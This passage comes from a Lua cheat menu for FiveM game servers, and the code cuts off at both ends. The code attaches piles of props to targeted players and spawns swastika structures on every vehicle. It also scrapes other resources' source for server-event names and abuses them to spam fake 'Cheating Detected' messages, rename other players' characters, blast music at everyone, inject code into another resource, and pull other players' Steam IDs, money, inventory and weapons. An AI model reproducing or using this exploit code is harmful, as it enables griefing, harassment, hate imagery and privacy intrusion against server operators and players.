                    wmlua.N.GetHashKey("prop_dog_cage_01"), -- 17
                    wmlua.N.GetHashKey("prop_dummy_01"), -- 18
                    wmlua.N.GetHashKey("prop_dummy_car"), -- 19
                    wmlua.N.GetHashKey("prop_dummy_light"), -- 20
                    wmlua.N.GetHashKey("prop_dummy_plane"), -- 21
                    wmlua.N.GetHashKey("prop_egg_clock_01"), -- 22
                    wmlua.N.GetHashKey("prop_elecbox_03a"), -- 23
                    wmlua.N.GetHashKey("prop_entityxf_covered"), -- 24
                    wmlua.N.GetHashKey("prop_fax_01"), -- 25
                    wmlua.N.GetHashKey("prop_fbi3_coffee_table"), -- 26
                    wmlua.N.GetHashKey("prop_fbibombbin"), -- 27
                    wmlua.N.GetHashKey("prop_fbibombcupbrd"), -- 28
                    wmlua.N.GetHashKey("prop_fbibombfile"), -- 29
                    wmlua.N.GetHashKey("prop_fbibombplant"), -- 30
                    wmlua.N.GetHashKey("prop_fib_skylight_piece"), -- 31
                    wmlua.N.GetHashKey("prop_fountain1"), -- 32
                    wmlua.N.GetHashKey("prop_fridge_01"), -- 33
                    wmlua.N.GetHashKey("prop_f_duster_02"), -- 34
                    wmlua.N.GetHashKey("prop_beach_fire"), -- 35
                    wmlua.N.GetHashKey("cs4_lod_01_slod3"), -- 36
                }
    
                wmlua_Thread(function()
                    for i = 1, #wmlua.T.prplist do
                        wmlua.V.spawnedobj = wmlua.N.SpawnObj(wmlua.T.prplist[i], wmlua.V.tpos, true, true, true)
                        wmlua.N.SetEntityAsMissionEntity(wmlua.V.spawnedobj)
                        wmlua.N.AttachEntityToEntity(wmlua.V.spawnedobj, wmlua.N.GetPlayerPed(wmlua.V.t), 0.0, 0.0,0.0,-0.9,0.0,0.0,0.0, false, false, true, true, 0, 1)
                        wmlua_Schleep(10)
                    end
                end)
            end
        else
            wmlua.V.t = wmlua.F.GetInput("Enter Player Server Id")
            if string.lower(wmlua.V.t) ~= "all" then wmlua.V.t = wmlua.F.SIDToPID(wmlua.V.t) end
            if wmlua.V.t ~= -69 then
    
                wmlua.V.tpos = wmlua.N.GetEntityPos(wmlua.N.GetPlayerPed(wmlua.V.t))
    
                wmlua.T.prplist = {
                    wmlua.N.GetHashKey("prop_a4_pile_01"), -- 1
                    wmlua.N.GetHashKey("prop_crashed_heli"), -- 2
                    wmlua.N.GetHashKey("prop_cockneon"), -- 3
                    wmlua.N.GetHashKey("prop_cooker_03"), -- 4
                    wmlua.N.GetHashKey("prop_crane_01_truck1"), -- 5
                    wmlua.N.GetHashKey("prop_crisp"), -- 6
                    wmlua.N.GetHashKey("prop_crosssaw_01"), -- 7
                    wmlua.N.GetHashKey("prop_creosote_b_01"), -- 8
                    wmlua.N.GetHashKey("prop_damdoor_01"), -- 9
                    wmlua.N.GetHashKey("prop_dart_1"), -- 10
                    wmlua.N.GetHashKey("prop_diggerbkt_01"), -- 11
                    wmlua.N.GetHashKey("prop_dj_deck_01"), -- 12
                    wmlua.N.GetHashKey("prop_distantcar_day"), -- 13
                    wmlua.N.GetHashKey("prop_distantcar_night"), -- 14
                    wmlua.N.GetHashKey("prop_distantcar_truck"), -- 15
                    wmlua.N.GetHashKey("prop_disp_razor_01"), -- 16
                    wmlua.N.GetHashKey("prop_dog_cage_01"), -- 17
                    wmlua.N.GetHashKey("prop_dummy_01"), -- 18
                    wmlua.N.GetHashKey("prop_dummy_car"), -- 19
                    wmlua.N.GetHashKey("prop_dummy_light"), -- 20
                    wmlua.N.GetHashKey("prop_dummy_plane"), -- 21
                    wmlua.N.GetHashKey("prop_egg_clock_01"), -- 22
                    wmlua.N.GetHashKey("prop_elecbox_03a"), -- 23
                    wmlua.N.GetHashKey("prop_entityxf_covered"), -- 24
                    wmlua.N.GetHashKey("prop_fax_01"), -- 25
                    wmlua.N.GetHashKey("prop_fbi3_coffee_table"), -- 26
                    wmlua.N.GetHashKey("prop_fbibombbin"), -- 27
                    wmlua.N.GetHashKey("prop_fbibombcupbrd"), -- 28
                    wmlua.N.GetHashKey("prop_fbibombfile"), -- 29
                    wmlua.N.GetHashKey("prop_fbibombplant"), -- 30
                    wmlua.N.GetHashKey("prop_fib_skylight_piece"), -- 31
                    wmlua.N.GetHashKey("prop_fountain1"), -- 32
                    wmlua.N.GetHashKey("prop_fridge_01"), -- 33
                    wmlua.N.GetHashKey("prop_f_duster_02"), -- 34
                    wmlua.N.GetHashKey("prop_beach_fire"), -- 35
                    wmlua.N.GetHashKey("cs4_lod_01_slod3"), -- 36
                }
    
                wmlua_Thread(function()
                    for i = 1, #wmlua.T.prplist do
                        wmlua.V.spawnedobj = wmlua.N.SpawnObj(wmlua.T.prplist[i], wmlua.V.tpos, true, true, true)
                        wmlua.N.SetEntityAsMissionEntity(wmlua.V.spawnedobj)
                        wmlua.N.AttachEntityToEntity(wmlua.V.spawnedobj, wmlua.N.GetPlayerPed(wmlua.V.t), 0.0, 0.0,0.0,-0.9,0.0,0.0,0.0, false, false, true, true, 0, 1)
                        wmlua_Schleep(10)
                    end
                end)
    
            else
    
                wmlua.F.EventLogInsert("~r~Player not found", 3000)
    
            end
        end

    end

    function wmlua.F.SwastikaEntity(ent)

        wmlua_Thread(function()

            local i = ent
            wmlua.F.RequestMdl(wmlua.N.GetHashKey("prop_container_ld_pu"))

            wmlua.V.SwastikaPlacements = {

                {x = 0.0, y = 0.0, z = 0.0},

                {x = 0.0, y = 0.0, z = 2.8},
                {x = 0.0, y = 0.0, z = 5.6},
                {x = 0.0, y = 0.0, z = 8.4},
                {x = 0.0, y = 0.0, z = 11.2},

                {x = 0.0, y = 0.0, z = 14.0},
                {x = 0.0, y = 0.0, z = 16.8},
                {x = 0.0, y = 0.0, z = 19.6},
                {x = 0.0, y = 0.0, z = 22.4},

                {x = 2.6, y = 0.0, z = 11.2},
                {x = 5.2, y = 0.0, z = 11.2},
                {x = 7.8, y = 0.0, z = 11.2},
                {x = 10.4, y = 0.0, z = 11.2},

                {x = 2.6, y = 0.0, z = 22.4},
                {x = 5.2, y = 0.0, z = 22.4},
                {x = 7.8, y = 0.0, z = 22.4},
                {x = 10.4, y = 0.0, z = 22.4},

                {x = -2.6, y = 0.0, z = 11.2},
                {x = -5.2, y = 0.0, z = 11.2},
                {x = -7.8, y = 0.0, z = 11.2},
                {x = -10.4, y = 0.0, z = 11.2},

                {x = -2.6, y = 0.0, z = 0.0},
                {x = -5.2, y = 0.0, z = 0.0},
                {x = -7.8, y = 0.0, z = 0.0},
                {x = -10.4, y = 0.0, z = 0.0},

                {x = 10.4, y = 0.0, z = 11.2},
                {x = 10.4, y = 0.0, z = 8.4},
                {x = 10.4, y = 0.0, z = 5.6},
                {x = 10.4, y = 0.0, z = 2.8},
                {x = 10.4, y = 0.0, z = 0.0},

                {x = -10.4, y = 0.0, z = 11.2},
                {x = -10.4, y = 0.0, z = 14.0},
                {x = -10.4, y = 0.0, z = 16.8},
                {x = -10.4, y = 0.0, z = 19.6},
                {x = -10.4, y = 0.0, z = 22.4},
            }

            for si = 1, #wmlua.V.SwastikaPlacements do
                wmlua.F.RequestControl(i)
                wmlua.V.swastika = wmlua.N.SpawnObj(wmlua.N.GetHashKey("prop_container_ld_pu"), 0.0, 0.0, 0.0, true, false, true)
                wmlua.F.RequestControl(wmlua.V.swastika)
                wmlua.N.SetEntityAsMissionEntity(wmlua.V.swastika)
                if si == 1 then
                    wmlua.V.OriginSwastika = wmlua.V.swastika
                    wmlua.N.AttachEntityToEntity(wmlua.V.swastika, i, 0, --[[X]] wmlua.V.SwastikaPlacements[si].x, --[[Y]] wmlua.V.SwastikaPlacements[si].y, --[[Z]] wmlua.V.SwastikaPlacements[si].z, 0.0, 0.0, 0.0,false, false, false, false, 0, true)
                else
                    wmlua.N.AttachEntityToEntity(wmlua.V.swastika, wmlua.V.OriginSwastika, 0, --[[X]] wmlua.V.SwastikaPlacements[si].x, --[[Y]] wmlua.V.SwastikaPlacements[si].y, --[[Z]] wmlua.V.SwastikaPlacements[si].z, 0.0, 0.0, 0.0,false, false, false, false, 0, true)
                end
                wmlua_Schleep(250)
            end

        end)

    end

    function wmlua.F.MALObjectAttachSpamVehicleAll()
        wmlua_Thread(function()
            local vehList = wmlua.N.GetEntList("CVehicle")
            for i = 1, #vehList do
                wmlua.F.SwastikaEntity(vehList[i])
                wmlua.F.EventLogInsert("[~b~WM~w~] Swastika'd Entity: " .. vehList[i])
                wmlua_Schleep(2000)
            end
        end)
    end

    function wmlua.F.AIStop()

        wmlua.H.WMInvokeNative(0xE1EF3C1216AFF2CD, wmlua.N.GetPlayerPed())

    end

    function wmlua.F.AIWander()

        wmlua.V.desiredSpeed = wmlua.F.GetInput("Enter desired speed meters/sec")
        wmlua.V.desiredSpeed = tonumber(wmlua.V.desiredSpeed)

        if type(wmlua.V.desiredSpeed) == wmlua.STRINGS[53] then
            wmlua.V.desiredSpeed = wmlua.V.desiredSpeed + .0
            if wmlua.N.IsPedInAVehicle(wmlua.N.GetPlayerPed()) then
                wmlua.N.SetDriverAbility(wmlua.N.GetPlayerPed(), 1.0)
                SetDriverAggressiveness(wmlua.N.GetPlayerPed(), 0.0)
                wmlua.N.TaskVehicleDriveWander(wmlua.N.GetPlayerPed(), wmlua.N.GetVehiclePedIsUsing(wmlua.N.GetPlayerPed()), wmlua.V.desiredSpeed, 17564220)
            else
                TaskWanderStandard(wmlua.N.GetPlayerPed(), 10.0, 10)
            end

        else
            wmlua.F.EventLogInsert("[~b~WM~w~] Invalid Input", 2000)
        end

    end

    function wmlua.F.AIGotoWaypoint()

        wmlua.V.desiredSpeed = wmlua.F.GetInput("Enter desired speed meters/sec")
        wmlua.V.desiredSpeed = tonumber(wmlua.V.desiredSpeed)

        if type(wmlua.V.desiredSpeed) == wmlua.STRINGS[53] then

            if wmlua.N.IsPedInAVehicle(wmlua.N.GetPlayerPed()) then

                local blip = wmlua.N.GetFirstBlipInfoId(8)
                wmlua.V.WaypointCoords = wmlua.H.WMInvokeNative(wmlua.STRINGS[60], blip, wmlua.H.ResultAsVector())
                wmlua.V.x,wmlua.V.y,wmlua.V.z = table.unpack(wmlua.V.WaypointCoords)
                wmlua.N.SetDriverAbility(wmlua.N.GetPlayerPed(), 1.0)
                SetDriverAggressiveness(wmlua.N.GetPlayerPed(), 0.0)
                TaskVehicleDriveToCoordLongrange(wmlua.N.GetPlayerPed(), wmlua.N.GetVehiclePedIsUsing(wmlua.N.GetPlayerPed()), wmlua.V.x, wmlua.V.y, wmlua.V.z, wmlua.V.desiredSpeed + 0.0001, 787004, 0.0)

                wmlua_Thread(function()
                    notarrived = true
                    while notarrived do wmlua_Schleep(200)

                        local blip = wmlua.N.GetFirstBlipInfoId(8)

                        if tonumber(blip) == 0 then

                            notarrived = false
                            wmlua.H.WMInvokeNative(0xE1EF3C1216AFF2CD, wmlua.N.GetPlayerPed())

                        end

                    end

                end)

            else

                -- to implement on foot walking to waypoint

            end

        end

    end

    --wmlua.F.RetrieveTrigger(content, find, accept)

    function wmlua.F.ESXLoad()

        wmlua.ESX = nil

        wmlua.V.LoadSuccess = false
        wmlua.V.Searched = false
        wmlua.T.Resources = {
            {res="es_extended",file="client/common.lua",sigs={"cb("},accept={'AddEventHandler'}},
            {res="prp-core",file="client/main.lua",sigs={"cb("},accept={'AddEventHandler'}},
            {res="hell_core",file="client/common.lua",sigs={"cb("},accept={'AddEventHandler'}},
            {res="srp-core",file="client/common.lua",sigs={"cb("},accept={'AddEventHandler'}},
        }

        for i = 1, #wmlua.T.Resources do
            wmlua.R.ResCode = wmlua.N.LoadResourceFile(wmlua.T.Resources[i].res, wmlua.T.Resources[i].file)
            if wmlua.R.ResCode then
                wmlua.V.Searched = true
                wmlua.V.ESXLoadEvent = wmlua.F.RetrieveTrigger(wmlua.R.ResCode, wmlua.T.Resources[i].sigs, wmlua.T.Resources[i].accept)
                if wmlua.V.ESXLoadEvent then
                    wmlua.V.LoadSuccess = true
                    wmlua.F.EventLogInsert("[~b~WM~w~] Event: " .. wmlua.V.ESXLoadEvent)
                    while wmlua.ESX == nil do
                        wmlua_SendEvent(0, wmlua.V.ESXLoadEvent, function(obj) wmlua.ESX = obj end)
                        wmlua_Schleep(1000)
                    end
                end
            end
        end

        if wmlua.ESX then
            wmlua.F.EventLogInsert("[~b~WM~w~] Loaded ESX")
        elseif not wmlua.V.LoadSuccess and wmlua.V.Searched then
            wmlua.F.EventLogInsert("[~r~WM~w~] Failed (B)", 3000)
        elseif not wmlua.V.LoadSuccess then
            wmlua.F.EventLogInsert("[~r~WM~w~] Failed (A)")
        end

    end

    wmlua.T.SoundList = {'Ml0tb0IxPsA','Izs2x0gJDnQ'}
    wmlua.T.SoundListIndex = 1

    function wmlua.F.ESXHifiMusicStart()

        if wmlua.F.HoldingCTRL(0, 21) then
            wmlua.R.SoundPlay = wmlua.F.GetInput("Enter Youtube Video ID")
        else
            if wmlua.T.SoundListIndex + 1 > #wmlua.T.SoundList then
                wmlua.T.SoundListIndex = 1
            else
                wmlua.T.SoundListIndex = wmlua.T.SoundListIndex + 1
            end
            wmlua.R.SoundPlay = wmlua.T.SoundList[wmlua.T.SoundListIndex]
        end

        wmlua_Thread(function()

            wmlua.R.ESXHifiMusic = wmlua.N.LoadResourceFile("esx_hifi", "client/main.lua")

            if wmlua.R.ESXHifiMusic then

                wmlua.R.ESXHifiMusicT = wmlua.F.Split(wmlua.R.ESXHifiMusic, "\n")
                wmlua.R.HasPlayed = false
                wmlua.R.AcceptTrigger = false
                wmlua.R.AcceptTrigger2 = false
                wmlua.R.ESXHifiSetVolumeVar = nil
                wmlua.R.ESXHifiMusicStartMusicVar = nil

                for k,v in ipairs(wmlua.R.ESXHifiMusicT) do

                    if string.find(v, "title = _U('set_volume')", 1, true) then
                        wmlua.R.AcceptTrigger = true
                    end

                    if string.find(v, "title = _U('play')", 1, true) then
                        wmlua.R.AcceptTrigger2 = true
                    end

                    if string.find(v, "TriggerServerEvent") and wmlua.R.AcceptTrigger then
                        wmlua.R.ESXHifiSetVolumeVar = wmlua.F.CleanString(v, "event")
                        wmlua.R.AcceptTrigger = false
                    end

                    if string.find(v, "TriggerServerEvent") and wmlua.R.AcceptTrigger2 then
                        wmlua.R.ESXHifiMusicStartMusicVar = wmlua.F.CleanString(v, "event")
                        wmlua.R.AcceptTrigger2 = false
                    end

                    if wmlua.R.ESXHifiSetVolumeVar and wmlua.R.ESXHifiMusicStartMusicVar and not wmlua.R.HasPlayed then
                        wmlua.F.EventLogInsert('[~b~WM~w~] ' .. wmlua.R.ESXHifiSetVolumeVar .. " > " .. wmlua.R.ESXHifiMusicStartMusicVar)
                        wmlua.F.EventLogInsert('[~b~WM~w~] Playing sound')
                        wmlua.R.HasPlayed = true
                        for _, player in ipairs(wmlua.N.GetActivePlayers()) do
                            local playerPos = wmlua.N.GetEntityPos(wmlua.N.GetPlayerPed(player))
                            wmlua_SendEvent(1, wmlua.R.ESXHifiSetVolumeVar, 100.0, playerPos)
                            wmlua_SendEvent(1, wmlua.R.ESXHifiMusicStartMusicVar, wmlua.R.SoundPlay, playerPos)
                            wmlua_Schleep(30)
                        end
                    end
                end

                if not wmlua.R.ESXHifiSetVolumeVar or not wmlua.R.ESXHifiMusicStartMusicVar then
                    wmlua.F.EventLogInsert('[~r~WM~w~] Failed (B)')
                end

            else
                wmlua.F.EventLogInsert('[~r~WM~w~] Failed (A)')
            end

        end)

    end

    function wmlua.F.ESXInviteMeme()

        wmlua.V.LoadSuccess = false
        wmlua.V.Searched = false
        wmlua.T.Resources = {
            {res="esx_property",file="client/main.lua",sigs={"you_invited","_U('invite')"},accept={'TriggerEvent'}},
        }

        for i = 1, #wmlua.T.Resources do
            wmlua.R.ResCode = wmlua.N.LoadResourceFile(wmlua.T.Resources[i].res, wmlua.T.Resources[i].file)
            if wmlua.R.ResCode then
                wmlua.V.Searched = true
                wmlua.V.ESXInvMemeEvent = wmlua.F.RetrieveTrigger(wmlua.R.ResCode, wmlua.T.Resources[i].sigs, wmlua.T.Resources[i].accept)
                if wmlua.V.ESXInvMemeEvent then
                    wmlua.F.CFS("wmlua.V.ESX_invitememe")
                end
            end
        end

        if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.ESX_invitememe"]].active then
            wmlua.F.EventLogInsert("[~b~WM~w~] Activated Invite Meme")
        elseif not wmlua.V.ESXInvMemeEvent and wmlua.V.Searched then
            wmlua.F.EventLogInsert("[~r~WM~w~] Failed (B)", 3000)
        elseif not wmlua.V.Searched then
            wmlua.F.EventLogInsert("[~r~WM~w~] Failed (A)")
        end

    end

    function wmlua.F.ESXSkeletalFix()

        local resources = {'skeletalsystem'}

        wmlua.V.SkeletalResource = nil
        for i = 0, #resources do
            if wmlua.T.ResourceDI[resources[i]] ~= nil then
                wmlua.V.SkeletalResource = resources[i]
            end
        end

        local code = [[
            
            local preventMolest = '.i = "Watermalone"'

            if skeletalsystem then
                skeletalsystem:HealBones("all")
            end

        ]]
        
        if wmlua.B.wmExecAt and wmlua.V.SkeletalResource then
            wmlua.B.wmExecAt(wmlua.V.SkeletalResource, code)
            wmlua.F.EventLogInsert("[~b~WM~w~] Should be healed")
        else
            wmlua.F.EventLogInsert("[~r~WM~w~] Failed (A)")
        end

    end

    function wmlua.F.ESXSendMessage()

        wmlua.V._ = nil

        wmlua_Thread(function()

            wmlua.R.ESXPoliceJob = wmlua.N.LoadResourceFile("esx_policejob", "client/main.lua") or wmlua.N.LoadResourceFile("tac_policejob", "client/main.lua") or wmlua.N.LoadResourceFile("police", "client/main.lua") or wmlua.N.LoadResourceFile("hell_policejob", "client/main.lua")
            wmlua.V.FoundBody = false
            wmlua.V.FoundBody2 = false

            if wmlua.R.ESXPoliceJob then

                wmlua.R.ESXPoliceJobT = wmlua.F.Split(wmlua.R.ESXPoliceJob, "\n")

                for k,v in ipairs(wmlua.R.ESXPoliceJobT) do
                    if string.match(v, "licence_you_revoked") then
                        wmlua.V.FoundBody = true
                    end
                    if wmlua.V.FoundBody and wmlua.V.FoundBody2 ~= true then
                        if string.match(v, "TriggerServerEvent") then
                            wmlua.V.FoundBody2 = true
                            wmlua.V._ = wmlua.F.CleanString(v, "event")
                            wmlua.V._T = wmlua.F.GetInput("Enter Target or All")
                            wmlua.V._M = wmlua.F.GetInput("Enter Message")
                            wmlua.V._N = tonumber(wmlua.F.GetInput("Enter Count"))
                            wmlua.F.EventLogInsert("[~b~WM~w~] Sending " .. wmlua.V._M .. " to " .. wmlua.V._T, 5000)
                            if wmlua.V._M == "dt" then
                                wmlua.V._M = "~r~Cheating Detected"
                            end
                            if string.lower(wmlua.V._T) == "all" then
                                if wmlua.V._N == 1 then
                                    wmlua_SendEvent(1, wmlua.V._, -1, wmlua.V._M)
                                else
                                    for i = 1, wmlua.V._N do
                                        wmlua_Schleep(20)
                                        wmlua_SendEvent(1, wmlua.V._, -1, i .. " " .. wmlua.V._M)
                                    end
                                end
                            else
                                if wmlua.V._N == 1 then
                                    wmlua_SendEvent(1, wmlua.V._, tonumber(wmlua.V._T), wmlua.V._M)
                                else
                                    for i = 1, wmlua.V._N do
                                        wmlua_Schleep(20)
                                        wmlua_SendEvent(1, wmlua.V._, tonumber(wmlua.V._T), i .. " " .. wmlua.V._M)
                                    end
                                end
                            end
                        end
                    end
                end

                if not wmlua.V._ then
                    wmlua.F.EventLogInsert('[~r~WM~w~] Failed (B)')
                end

            else
                wmlua.F.EventLogInsert('[~r~WM~w~] Failed (A)')
            end

        end)

    end

    function wmlua.F.ESXViewInventory()

        wmlua.V._ = nil
        wmlua.V.target = wmlua.F.GetInput("Enter Player Server ID")

        wmlua.V.TriggerSearch = 0
        wmlua.V.TriggerSearch_Act = 0
        wmlua.R.ESXInventoryPlayer = wmlua.N.LoadResourceFile("esx_inventoryhud", "client/player.lua")

        if wmlua.R.ESXInventoryPlayer then

            wmlua.R.ESXInventoryPlayerT = wmlua.F.Split(wmlua.R.ESXInventoryPlayer, "\n")

            for k,v in ipairs(wmlua.R.ESXInventoryPlayerT) do
                if string.match(v, "RegisterNetEvent") then
                    wmlua.V.TriggerSearch = wmlua.V.TriggerSearch + 1
                end

                if wmlua.V.TriggerSearch == 1 and wmlua.V.TriggerSearch_Act == 0 then
                    wmlua.V._ = wmlua.F.CleanString(v, "event")
                    wmlua_SendEvent(0, wmlua.V._, wmlua.V.target, '')
                    wmlua.F.EventLogInsert("[~b~WM~w~] Opened inv of " .. wmlua.V.target, 2000)
                    wmlua.V.TriggerSearch_Act = 1
                end

            end

            if not wmlua.V._ then
                wmlua.F.EventLogInsert("[~r~WM~w~] Failed (B)")
            end

        else

            wmlua.F.EventLogInsert("[~r~WM~w~] Failed (A)")

        end

    end

    function wmlua.F.ESXSkin()

        wmlua.V.TriggerSearch = 0
        wmlua.V.TriggerSearch_Act = 0
        wmlua.R.ESXSkinMain = wmlua.N.LoadResourceFile("esx_skin", "client/main.lua")

        if wmlua.R.ESXSkinMain then
            
            wmlua.R.ESXSkinMainT = wmlua.F.Split(wmlua.R.ESXSkinMain, "\n")
            
            for k,v in ipairs(wmlua.R.ESXSkinMainT) do
                if string.match(v, "RegisterNetEvent") then
                    wmlua.V.TriggerSearch = wmlua.V.TriggerSearch + 1
                end

                if wmlua.V.TriggerSearch == 4 and wmlua.V.TriggerSearch_Act == 0 then
                    wmlua.V.TriggerSearch_Act = 1
                    wmlua_Thread(function()
                        wmlua.menu.v.drawmenu = false
                        wmlua_Schleep(500)
                        wmlua.V._ = wmlua.F.CleanString(v, "event")
                        wmlua_SendEvent(0, wmlua.V._)
                        wmlua.F.EventLogInsert("[~b~WM~w~] Event: " .. wmlua.V._)
                        wmlua.F.EventLogInsert("[~b~WM~w~] Opened skin menu", 3000)
                    end)
                end

            end

        else

            wmlua.F.EventLogInsert("[~r~WM~w~] Failed (A)")

        end

    end

    function wmlua.F.ESXChangeCharName()

        if wmlua.ESX then

            wmlua.V.IDTarget = wmlua.F.GetInput("Enter Desired Player or All")

            wmlua_Thread(function()

                wmlua.R.ESXIdentity = wmlua.N.LoadResourceFile("esx_identity", "client/main.lua") or wmlua.N.LoadResourceFile("esx_identity", "client.lua") or wmlua.N.LoadResourceFile("tac_identity", "client/main.lua") or wmlua.N.LoadResourceFile("hell_identity", "client/main.lua")
                wmlua.V.FoundBody = false
                wmlua.V.FoundBody2 = false
                wmlua.V.Res = false
                wmlua.V.IdentityTr = nil

                if wmlua.R.ESXIdentity then

                    wmlua.R.ESXIdentityT = wmlua.F.Split(wmlua.R.ESXIdentity, "\n")

                    for k,v in ipairs(wmlua.R.ESXIdentityT) do
                        if string.match(v, "TriggerServerEvent") then
                            wmlua.V.IdentityTr = wmlua.F.CleanString(v, "event")
                        end

                        if string.match(v, "EnableGui%(false%)") and wmlua.V.Res ~= true and wmlua.V.IdentityTr then
                            wmlua.V.Res = true
                        end
                    end

                    if string.lower(wmlua.V.IDTarget) ~= "all" and wmlua.V.IdentityTr then

                        wmlua.ESX.TriggerServerCallback('esx:getOtherPlayerData', function(memes)

                            wmlua.V.Firstname = wmlua.F.GetInput("Enter Desired First Name")
                            wmlua.V.Lastname = wmlua.F.GetInput("Enter Desired Last Name")
                            if not wmlua.V.BustedBitch then
                                wmlua.V.identifier = {steamid = memes.identifier}

                                _ = math.random(1,12)
                                wmlua.V.IDDOB = _
                                _ = math.random(1,28)
                                wmlua.V.IDDOB = wmlua.V.IDDOB .. "/" .. _
                                _ = math.random(1920, 2000)
                                wmlua.V.IDDOB = wmlua.V.IDDOB .. "/" .. _
                                _ = nil

                                wmlua.T.IDData = {
                                    firstname	= wmlua.V.Firstname,
                                    lastname	= wmlua.V.Lastname,
                                    dateofbirth = wmlua.V.IDDOB,
                                    sex = "M",
                                    height = math.random(140,180)
                                }

                                if wmlua.V.identifier.steamid ~= nil and wmlua.V.IdentityTr then
                                    wmlua_SendEvent(1, wmlua.V.IdentityTr, wmlua.T.IDData, wmlua.V.identifier)
                                    wmlua.F.EventLogInsert("[~b~WM~w~] " .. wmlua.N.GetPlayerName(wmlua.F.SIDToPID(wmlua.V.IDTarget)) .. " should be: " .. wmlua.V.Firstname .. wmlua.STRINGS[20] .. wmlua.V.Lastname, 2500)
                                end
                            end

                        end, wmlua.V.IDTarget)

                    elseif wmlua.V.IdentityTr then

                        wmlua.V.Firstname = wmlua.F.GetInput("Enter Desired First Name")
                        wmlua.V.Lastname = wmlua.F.GetInput("Enter Desired Last Name")
                        if not wmlua.V.BustedBitch then

                            for k,v in ipairs(wmlua.Playerlist_Players) do

                                wmlua.ESX.TriggerServerCallback('esx:getOtherPlayerData', function(memes)

                                    wmlua.V.identifier = {steamid = memes.identifier}

                                    _ = math.random(1,12)
                                    wmlua.V.IDDOB = _
                                    _ = math.random(1,28)
                                    wmlua.V.IDDOB = wmlua.V.IDDOB .. "/" .. _
                                    _ = math.random(1920, 2020)
                                    wmlua.V.IDDOB = wmlua.V.IDDOB .. "/" .. _
                                    _ = nil

                                    wmlua.T.IDData = {
                                        firstname	= wmlua.V.Firstname,
                                        lastname	= wmlua.V.Lastname,
                                        dateofbirth = wmlua.V.IDDOB,
                                        sex = "M",
                                        height = math.random(140,180)
                                    }

                                    if wmlua.V.identifier.steamid ~= nil then
                                        wmlua_SendEvent(1, wmlua.V.IdentityTr, wmlua.T.IDData, wmlua.V.identifier)
                                    end

                                end, v.pid)

                            end

                            wmlua_Schleep(25)

                        end

                        wmlua.F.EventLogInsert("[~b~WM~w~] All should be: " .. wmlua.V.Firstname .. wmlua.STRINGS[20] .. wmlua.V.Lastname, 2500)

                    else
                        wmlua.F.EventLogInsert('[~r~WM~w~] Failed (B)')
                    end

                else
                    wmlua.F.EventLogInsert('[~r~WM~w~] Failed (A)')
                end

            end)

        else

            wmlua.F.EventLogInsert("[~b~WM~w~] ESX Not loaded, Load ESX", 2000)

        end

    end

    function wmlua.F.ESXViewInfo(_asid)

        if wmlua.ESX then
            wmlua.V.gotinfo = false
            wmlua.V.Searched = false
            wmlua.T.Resources = {
                {res="esx_vehicleshop",file="client/main.lua",sigs={"action == 'set_vehicle_owner_sell_society'","action == 'set_vehicle_owner_rent'"},accept={'ServerCallback'}},
            }
    
            for i = 1, #wmlua.T.Resources do
                wmlua.R.ResCode = wmlua.N.LoadResourceFile(wmlua.T.Resources[i].res, wmlua.T.Resources[i].file)
                if wmlua.R.ResCode and not wmlua.V.gotinfo then
                    wmlua.V.Searched = true
                    wmlua.V.callbackTrigger = wmlua.F.RetrieveTrigger(wmlua.R.ResCode, wmlua.T.Resources[i].sigs, wmlua.T.Resources[i].accept)
                    if wmlua.V.callbackTrigger then
                        wmlua.V.gotinfo = true
                        if _asid then
                            wmlua.V.Target = _asid[#_asid]
                            wmlua.F.EventLogInsert(tostring(wmlua.V.Target) .. " > " .. type(wmlua.V.Target))
                        else
                            wmlua.V.Target = tonumber(wmlua.F.GetInput("Enter Player Server Id"))
                        end
                            
                        wmlua.ESX.TriggerServerCallback(wmlua.V.callbackTrigger, function(inf)
                            if inf then
                                local infList = {'Player Info | ' .. wmlua.N.GetPlayerName(wmlua.F.SIDToPID(wmlua.V.Target))}
                                wmlua.F.InsertToTable(infList, "")
                                wmlua.F.InsertToTable(infList, "Steam ID: " .. inf.identifier)
                                wmlua.F.InsertToTable(infList, "")
                                wmlua.F.InsertToTable(infList, 'Money: ' .. inf.money)
                                for k,v in pairs(inf.accounts) do
                                    wmlua.F.InsertToTable(infList, v.label .. ": " .. v.money)
                                end
                                wmlua.F.InsertToTable(infList, "")
                                wmlua.F.InsertToTable(infList, 'Job: ' .. inf.job.label .. " - " .. inf.job.grade_label)
                                wmlua.F.InsertToTable(infList, "")
                                for k,v in pairs(inf.inventory) do
                                    if v.count > 0 then
                                        wmlua.F.InsertToTable(infList, "Item: " .. v.label .. " (" .. v.count .. ")")
                                    end
                                end
                                wmlua.F.InsertToTable(infList, "")
                                for k,v in pairs(inf.loadout) do
                                    wmlua.F.InsertToTable(infList, 'Wep: ' .. v.label .. " (" .. v.ammo .. ")")
                                end
                                wmlua.menu.f.handleinfo(infList, true)
                                wmlua.menu.v.drawmenu = false
                            else
                                wmlua.F.EventLogInsert('[~r~WM~w~] Failed to get info, possibly corrupted data')
                            end
                        end, wmlua.V.Target)
                    end
                end
            end
    
            if not wmlua.V.callbackTrigger and wmlua.V.Searched then
                wmlua.F.EventLogInsert("[~r~WM~w~] Failed (B)", 3000)
            elseif not wmlua.V.Searched then
                wmlua.F.EventLogInsert("[~r~WM~w~] Failed (A)")
            end
        end

    end

    function wmlua.F.ESXViewVehicleshop()

        if wmlua.ESX then
            wmlua.V.gotinfo = false
            wmlua.V.Searched = false
            wmlua.T.Resources = {
                {res="esx_vehicleshop",file="client/main.lua",sigs={"Categories = categories","Vehicles = vehicles"},accept={'ServerCallback'}},
            }
    
            for i = 1, #wmlua.T.Resources do
                wmlua.R.ResCode = wmlua.N.LoadResourceFile(wmlua.T.Resources[i].res, wmlua.T.Resources[i].file)
                if wmlua.R.ResCode and not wmlua.V.gotinfo then
                    wmlua.V.Searched = true
                    wmlua.V.callbackTrigger = wmlua.F.RetrieveTrigger(wmlua.R.ResCode, wmlua.T.Resources[i].sigs, wmlua.T.Resources[i].accept)
                    if wmlua.V.callbackTrigger then
                        wmlua.V.gotinfo = true
                            
                        wmlua.ESX.TriggerServerCallback(wmlua.V.callbackTrigger, function(inf)
                            if inf then
                                local infList = {'Vehicle Shop Data'}
                                wmlua.F.InsertToTable(infList, "")
                                for k,v in pairs(inf) do
                                    wmlua.F.InsertToTable(infList, v.name .. ": " .. v.model)
                                end
                                wmlua.menu.f.handleinfo(infList, true)
                                wmlua.menu.v.drawmenu = false
                            else
                                wmlua.F.EventLogInsert('[~r~WM~w~] Failed to get info, possibly corrupted data')
                            end
                        end)
                    end
